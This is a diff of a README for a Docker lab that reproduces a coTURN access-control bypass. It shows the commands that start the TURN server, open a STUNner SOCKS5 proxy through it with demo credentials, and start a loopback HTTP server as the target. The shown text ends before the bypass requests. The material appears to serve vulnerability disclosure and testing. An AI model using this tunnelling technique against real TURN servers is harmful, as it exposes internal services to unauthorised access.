@@ -7,13 +7,25 @@
 In this scenario, after creating a socks5 proxy to the TURN server, it is possible using specific HTTP GET requests to access the loopback interface of the server.
 
 ## How to reproduce the issue
-As a first step, the containers are started with:
+**Note**: First, update the TURN server's IP address with you machine's IP in ```docker-compose.yaml``` (stunner container).
+
+The <i>coTURN</i> container is started automatically with the following command:
 ```bash
-docker compose up -d --build
+turnserver -v --user=username1:password1
 ```
-The behavior of the <i>coTURN</i> server is observed with:
+So its behavior can be observed by following the logs:
 ```bash
 docker logs coturn --follow
+```
+The <i>STUNner</i> container is started automatically with the following command:
+```bash
+stunner socks --turnserver 192.168.1.50:3478 --protocol tcp --username username1 --password password1 --listen 0.0.0.0:9999
+```
+This command creates a `socks5` server connected to the TURN server. It uses TCP as the protocol and the same credentials used to start the coTURN server; it listens on `0.0.0.0:9999`.
+
+So its behavior can be observed by following the logs:
+```bash
+docker logs stunner --follow
 ```
 
 ### Step 1: Start HTTP server on coturn loopback
@@ -24,18 +36,7 @@ python3 -m http.server 8000 --bind ::1
 ```
 Keep this terminal open.
 
-### Step 2: Create SOCKS5 proxy via stunner
-In a new terminal, access the <i>stunner</i> container:
-```bash
-docker exec -it stunner sh
-```
-and create a socks5 proxy with:
-```bash
-stunner socks --turnserver 10.0.0.10:3478 --protocol tcp --username username1 --password password1 --listen 0.0.0.0:9999
-```
-This command creates a `socks5` server connected to the TURN server. It uses TCP as the protocol and the same credentials used to start the coTURN server; it listens on `0.0.0.0:9999`.
-
-### Step 3: Exploit the vulnerability
+### Step 2: Exploit the vulnerability
 In another terminal inside the stunner container, test the access control bypass:
 
 **Test 1 - Standard loopback (blocked):**
